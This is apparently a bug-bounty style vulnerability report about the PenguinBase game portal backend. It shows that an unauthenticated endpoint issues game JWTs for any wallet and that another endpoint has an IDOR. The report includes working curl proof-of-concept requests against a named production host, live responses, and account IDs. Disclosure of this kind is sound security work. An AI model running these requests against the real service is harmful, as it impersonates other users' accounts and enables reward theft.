# [HIGH] Aitken Portal: Unauthenticated Game Token Issuance Allows Impersonation of Any Wallet in PenguinBase Game System

## Summary

The PenguinBase game backend (`aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io`) issues signed JWT game authentication tokens for **any wallet address** without requiring proof of ownership. An attacker can obtain a valid game session for any victim's wallet, play games under their identity, and accumulate in-game rewards or progress attributed to the victim's account.

---

## Severity

**HIGH**

---

## Affected Asset

- **URL**: `https://aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io`
- **Endpoint**: `POST /api/game/launch`
- **Referenced by**: `https://penguinbase.com` (JS bundle `_next/static/chunks/3157-b919d218be618642.js` — service key `AITKEN_PORTAL`)
- **Environment**: Production (confirmed by `/api/health` → `"environment":"Production"`)

---

## Vulnerability Description

`POST /api/game/launch` accepts a JSON body `{"gameId": <id>, "walletAddress": "<any>"}` and returns a signed JWT game auth token **without any authentication or wallet ownership verification**. No session cookie, no API key, no EIP-712 signature is required.

### Request

```http
POST /api/game/launch HTTP/1.1
Host: aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io
Content-Type: application/json;charset=UTF-8

{"gameId": 762058282, "walletAddress": "0x<victim>"}
```

### Response

```json
{
  "message": "인증키 발급 완료",
  "authToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "gameUrl": "https://universe.minini.me"
}
```

### JWT Payload (decoded)

```json
{
  "accountId": "<victim_game_account_id>",
  "gameId": "762058282",
  "walletAddress": "0x<victim>",
  "type": "game_auth",
  "jti": "<uuid>",
  "exp": <now + 5 minutes>,
  "iss": "Portal",
  "aud": "PortalClient"
}
```

The server assigns a unique persistent `accountId` to each wallet address. The token grants access to the game session on behalf of the victim's account. Fresh tokens can be generated instantly on demand since there is no rate limiting or authentication gate.

---

## Games Affected

All games in the PenguinBase portal are reachable via the same endpoint by changing `gameId`:

| Game ID | Name | Game URL |
|---------|------|----------|
| 762058282 | minini-universe | `https://universe.minini.me` |
| 482429046 | SpaceJump | `https://spacejump.minini.me` |
| 349839940 | bakery-rush | `https://bakeryrush.minini.me` |
| 225623281 | guilded-dungeon | `https://red-dune-04dd2ec00.7.azurestaticapps.net` |

---

## Impact

1. **Game account impersonation**: Attacker obtains a valid game session for any victim's wallet. All game activity (scores, progress, achievements) is attributed to the victim's `accountId`.

2. **Reward theft**: PenguinBase distributes ecosystem rewards (airdrops, points, NFTs) based on gameplay participation. An attacker can grind games under a victim's identity and accumulate rewards without the victim's involvement — or falsely boost a chosen wallet.

3. **Persistent per-wallet accountIds**: The server maintains a stable `accountId` mapping per wallet across sessions. Impersonating a wallet always reaches the same game account, making the attack persistent.

4. **Unlimited token refresh**: The 5-minute JWT TTL is a non-mitigation — the attacker scripts continuous `/api/game/launch` calls to maintain an active session indefinitely.

---

## Proof of Concept

### Step 1 — Get game auth token for any wallet (no auth)

```bash
curl -X POST \
  "https://aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io/api/game/launch" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"gameId":762058282,"walletAddress":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"}'
```

**Live response (2026-06-03, production):**

```json
{
  "message": "인증키 발급 완료",
  "authToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50SWQiOiI3OTQ2MzY2NSIsImdhbWVJZCI6Ijc2MjA1ODI4MiIsIndhbGxldEFkZHJlc3MiOiIweGRlYWRiZWVmZGVhZGJlZWZkZWFkYmVlZmRlYWRiZWVmZGVhZGJlZWYiLCJ0eXBlIjoiZ2FtZV9hdXRoIiwianRpIjoiZTk2YjA5M2UtNmE4ZC00MDRmLWEwMDktNjYxODExZDA5MTFhIiwiZXhwIjoxNzgwNTAxNTgwLCJpc3MiOiJQb3J0YWwiLCJhdWQiOiJQb3J0YWxDbGllbnQifQ.3GodOks-CsLIvwPprnOAMhrs32rfoY5e-y2ZQjXzmwc",
  "gameUrl": "https://universe.minini.me"
}
```

Decoded JWT payload:
```json
{
  "accountId": "79463665",
  "gameId": "762058282",
  "walletAddress": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
  "type": "game_auth",
  "jti": "e96b093e-6a8d-404f-a009-661811d0911a",
  "exp": 1780501580,
  "iss": "Portal",
  "aud": "PortalClient"
}
```

### Step 2 — Confirmed unique accountId per wallet (account impersonation)

| Wallet Address | accountId |
|----------------|-----------|
| `0xdeadbeef...` | 79463665 |
| `0x11111111...` | 102121345 |
| `0xeb450C9b...` (real wallet) | 134584811 |

Each wallet maps to a persistent, unique game account. Calling the endpoint with a victim's address always returns a token for their account.

### Step 3 — Confirm production environment

```bash
curl "https://aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io/api/health" \
  -H "Authorization: Bearer <game_token>"
```

```json
{
  "status": "Healthy",
  "timestamp": "2026-06-03T15:43:35.0463618Z",
  "environment": "Production",
  "version": "1.0.0.0"
}
```

---

## Additional Finding: IDOR on `/wallet/account/{walletAddress}`

`GET /wallet/account/{walletAddress}` returns any wallet's game account data when authenticated with a game JWT — even if the JWT was issued for a **different** wallet. Since game JWTs can be obtained for any address via the unauthenticated `/api/game/launch`, this creates a full account enumeration path:

1. Obtain a game JWT for wallet A via unauthenticated `POST /api/game/launch`
2. Use that JWT to `GET /wallet/account/{wallet_B}` — returns `accountId`, `walletAddress`, `createdAt` for wallet B

**Live confirmation:**

```
JWT issued for: 0xdeadbeef... (accountId=79463665)

GET /wallet/account/0x1111...  → 200 {"accountId":102121345, "walletAddress":"0x1111...", "createdAt":"2026-06-03T..."}
GET /wallet/account/0xeb450C9b... → 200 {"accountId":134584811, "walletAddress":"0xeb450C9b...", "createdAt":"2026-06-03T..."}
```

The endpoint authorizes based on token presence only — it does not check whether the queried wallet matches the JWT's `walletAddress` claim.

---


## Recommended Fix

1. **Require session authentication**: The `/api/game/launch` endpoint must verify a valid PenguinBase session token (passed in the `Authorization` header or session cookie) before issuing a game JWT.

2. **Validate wallet ownership**: The `walletAddress` in the request body must match the wallet address associated with the authenticated session. An attacker with a valid session for wallet A must not be able to obtain a game token for wallet B.

3. **Add rate limiting**: Even after auth is added, rate-limit game token issuance per account (e.g., 1 launch per minute per wallet).

---

## References

- PenguinBase JS bundle: `/_next/static/chunks/3157-b919d218be618642.js`
  - Service config: `AITKEN_PORTAL.PROD = "https://aitken-portal-backend-prod.lemonriver-bce807d3.koreacentral.azurecontainerapps.io"`
  - Game IDs: `TAP_TAP=762058282, SPACE_JUMP=482429046, GILDED_DUNGEON=225623281`
- `/api/game` endpoint lists all available games and their URLs
- `/api/health` confirms `"environment":"Production"`
